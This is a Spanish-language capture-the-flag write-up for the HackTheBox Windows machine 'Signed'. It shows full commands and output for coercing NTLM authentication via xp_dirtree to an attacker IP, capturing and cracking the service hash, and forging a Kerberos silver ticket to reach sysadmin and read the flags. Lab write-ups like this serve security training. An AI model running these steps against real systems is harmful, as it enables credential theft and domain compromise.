
# Signed

<figure><img src="/files/9V7yi6SjXaocGG8lwpH1" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Signed`
* **IP:** `10.10.11.90`
* **Sistema operativo:** `Windows`
* **Dificultad:** `Medium`
* **Fecha:** `23/12/2025`

***

## <mark style="color:purple;">Configuración del host</mark>

La plataforma nos proporciona las credenciales iniciales para acceder al servicio MSSQL esta máquina:

```
scott / Sm230#C5NatH
```

## <mark style="color:purple;">Escaneo de puertos</mark>

#### Escaneo Simple

```bash
sudo nmap -v --open -A -T5 10.10.11.90
```

```bash
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-11-29T15:54:19+00:00; +1s from scanner time.
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-29T12:53:44
| Not valid after:  2055-11-29T12:53:44
| MD5:   47a9:f9cb:4deb:f933:9869:aa4e:4914:21ef
|_SHA-1: ad3a:3fc8:9b84:139c:3b9c:0eed:44dc:0830:d30e:790b
```

El host solamente tiene el **puerto 1433/tcp abierto**, ejecutando **Microsoft SQL Server 2022 (RTM)**. Las respuestas NTLM y DNS indican que el servidor forma parte del dominio **SIGNED.HTB**, con el equipo identificado como **DC01** (controlador de dominio).

👉 **No puedes hablar con Active Directory directamente.**

Eso es intencional.\
La máquina está DISEÑADA para que el **ÚNICO vector sea SQL**.

#### /etc/passwd

Añadimos la IP a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.90 signed.htb DC01.signed.htb" | sudo tee -a /etc/hosts
```

***

## <mark style="color:purple;">Enumeración MSSQL</mark>

Cómo tenemos abierto el puerto 1433 con el servicio de MS-SQL Server probaremos a acceder con las credenciales de kevin que nos proporcionaron:

```bash
impacket-mssqlclient 'scott:Sm230#C5NatH@10.10.11.90'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)> 
```

Funciona y podemos empezar a enumerar más cosas.

### Enumeración de MS-SQL Server

#### Versión

```plsql
SQL (scott  guest@master)> SELECT @@version;
                                                                                                                                                                                                                                         
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
	Oct  8 2022 05:58:25 
	Copyright (C) 2022 Microsoft Corporation
	Enterprise Evaluation Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

#### Enumeración de usuarios

```sql
SQL (scott  guest@master)> SELECT SYSTEM_USER; 
        
-----   
scott   

SQL (scott  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin'); 
    
-   
0   

SQL (scott  guest@master)> SELECT name, is_disabled FROM sys.sql_logins;
name    is_disabled   
-----   -----------   
sa                0   
scott             0   

SQL (scott  guest@master)> SELECT name FROM sys.databases;
name     
------   
master   
tempdb   
model    
msdb  
```

#### **Usuario autenticado**

* Estamos conectado como el usuario **scott** (`SELECT SYSTEM_USER;` → *scott*).

#### **Privilegios limitados**

* El usuario **scott NO es sysadmin** (`IS_SRVROLEMEMBER('sysadmin') = 0`).
* Esto indica que tiene permisos restringidos dentro del SQL Server.

#### **Cuentas existentes en SQL Server**

* Hay dos logins:
  * **sa** (habilitado)
  * **scott** (habilitado)
* El hecho de que **sa** esté habilitado es interesante, ya que es la cuenta de administrador total del SQL Server.

#### **Bases de datos disponibles**

* Solo se muestran las bases por defecto:
  * **master**
  * **tempdb**
  * **model**
  * **msdb**
* No existen bases de datos adicionales creadas por el usuario o la aplicación.

El servidor tiene la cuenta **sa activa**, lo cual es un vector a explorar (password guessing, impersonation, escalada vía SQL Injection si existe). No hay bases de datos adicionales visibles, lo que apunta a una instalación bastante limpia o recién desplegada.

### Enumeración de BBDD

Después de enumerar las bases de datos no obtenemos nara relevante, por lo que probaremos otra vía.

***

## <mark style="color:purple;">Forzar autenticación NTLM</mark>

Aunque `scott` sea muy limitado, hay *extended stored procedures* que, si las puedes ejecutar, hacen que **el servicio de SQL Server intente acceder a un recurso UNC**.\
Eso provoca que **la cuenta con la que corre el servicio SQL (normalmente una cuenta de dominio o la máquina `DC01$`) se autentique vía NTLM hacia tu máquina**, y tú capturas el hash.

### Abrir responder en Kali

```bash
sudo responder -I tun0
```

### xp\_dirtree

Al ejecutar el siguiente comando:

```bash
SQL (scott  guest@tempdb)> EXEC master..xp_dirtree '\\10.10.15.52\share';

subdirectory   depth   
------------   -----  
```

Automáticamente recibimos en nuestro Kali el hash del usuario `mssqlsvc`!

<figure><img src="/files/Yug2majEgjcVknAPFlrb" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}

```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:aca74ab69f9c174f:3CF0F344E0C8A8D85A3EFA2344551791:0101000000000000807562DF9761DC0103CFEE751CEF32A40000000002000800500038004C00360001001E00570049004E002D004C00380032004C005A003700510057004E003700420004003400570049004E002D004C00380032004C005A003700510057004E00370042002E00500038004C0036002E004C004F00430041004C0003001400500038004C0036002E004C004F00430041004C0005001400500038004C0036002E004C004F00430041004C0007000800807562DF9761DC01060004000200000008003000300000000000000000000000003000004EF3FB484B234410FC22334359688C4870CE55B1A0127518252B5D0A101648D30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00350032000000000000000000
```

{% endcode %}

### Cracking de Hash

{% code overflow="wrap" %}

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 2803/5671 MB (1024 MB allocatable), 16MCU

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

MSSQLSVC::SIGNED:aca74ab69f9c174f:3cf0f344e0c8a8d85a3efa2344551791:0101000000000000807562df9761dc0103cfee751cef32a40000000002000800500038004c00360001001e00570049004e002d004c00380032004c005a003700510057004e003700420004003400570049004e002d004c00380032004c005a003700510057004e00370042002e00500038004c0036002e004c004f00430041004c0003001400500038004c0036002e004c004f00430041004c0005001400500038004c0036002e004c004f00430041004c0007000800807562df9761dc01060004000200000008003000300000000000000000000000003000004ef3fb484b234410fc22334359688c4870ce55b1a0127518252b5d0a101648d30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350032000000000000000000:purPLE9795!@
```

{% endcode %}

Tenemos la contraseña en plano!

```
MSSQLSVC / purPLE9795!@
```

***

## <mark style="color:purple;">Conexión a MSSQL</mark>

Nos conectamos usando Windows Auth:

```bash
impacket-mssqlclient 'SIGNED/MSSQLSVC:purPLE9795!@@10.10.11.90' -windows-auth

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```

Observamos que este usuario mssqlsvc tampoco es sysadmin, por lo que no podemos ejecutar `xp_cmdshell` para devolvernos una shell:

```sql
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SYSTEM_USER;              
---------------   
SIGNED\mssqlsvc   

SQL (SIGNED\mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');   
-   
0   
```

## Fabricar Ticket Kerberos falso

### 1. Obtener el SID de mssqlsvc

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT SUSER_SID('SIGNED\mssqlsvc');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

Lo guardamos. Es el SID **en hex**.

### 2. Convertir SID hex a SID legible

```python
python3 - << 'EOF'
import binascii

hex_sid = "0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
sid = binascii.unhexlify(hex_sid)

# S-Revision-Authority-SubAuthorities...
revision = sid[0]
sub_auth_count = sid[1]
identifier_authority = int.from_bytes(sid[2:8], 'big')
sub_auths = [str(int.from_bytes(sid[8+i*4:12+i*4], 'little')) for i in range(sub_auth_count)]

print(f"S-{revision}-{identifier_authority}-" + "-".join(sub_auths))
EOF

S-1-5-21-4088429403-1159899800-2753317549-1103
```

👉 **El RID de mssqlsvc es `1103` (los 4 últimos dígitos) y el resto es el `Domain SID.`** Esto lo necesitaremos para crear nuestro Silver Ticker.

### 3. Obtener NTLM hash de mssqlsvc

```python
python3 - << 'EOF'
import hashlib
pw = "purPLE9795!@".encode("utf-16le")
print(hashlib.new("md4", pw).hexdigest())
EOF

ef699384c3285c54128a3ee1ddb1a0cc
```

Tenemos el Hash NTLM

### 4. Configurar variables

```bash
# Configurar variables necesarias
export nthash="ef699384c3285c54128a3ee1ddb1a0cc"
export DOMSID="S-1-5-21-4088429403-1159899800-2753317549"
export IT_RID="1105"
export MSSQLSVC_RID="1103"
```

### 5. Crear Silver Ticket

```bash
impacket-ticketer \
  -nthash $nthash \
  -domain-sid "$DOMSID" \
  -domain SIGNED.HTB \
  -spn MSSQLSvc/DC01.SIGNED.HTB \
  -groups 512,$IT_RID \
  -user-id $MSSQLSVC_RID \
  mssqlsvc
  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

***

## <mark style="color:purple;">Explotar Silver Ticker</mark>

**El Silver Ticket se generó sin errores.** Ahora solo queda **cargarlo** y **entrar en SQL Server como Administrator** para conseguir **sysadmin** y finalmente **SYSTEM en el DC**.

#### 1. Cargar el Silver Ticket

```bash
afsh4ck@kali$ export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"
```

```bash
afsh4ck@kali$ klist

Ticket cache: FILE:/home/kali/Escritorio/machines/htb/signed/mssqlsvc.ccache
Default principal: mssqlsvc@SIGNED.HTB

Valid starting     Expires            Service principal
24/12/25 02:07:59  22/12/35 02:07:59  MSSQLSvc/DC01.SIGNED.HTB@SIGNED.HTB
	renew until 22/12/35 02:07:59
```

#### 2. Nos conectamos al SQL Server **solo con Kerberos** (sin password)

```bash
impacket-mssqlclient -k 'SIGNED.HTB/mssqlsvc@dc01.signed.htb' -windows-auth -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1 
```

Comprobamos que efectivamente, somos `sysadmin`!

***

## <mark style="color:purple;">Lectura de las flags desde MS SQL</mark>

### User flag

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS t;
BulkColumn                                
---------------------------------------   
b'e221ba51b24abb5561449e**********\r\n'
```

### Root flag

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;
BulkColumn                                
---------------------------------------   
b'acb6ff5ecaf2668db8a856**********\r\n'  
```
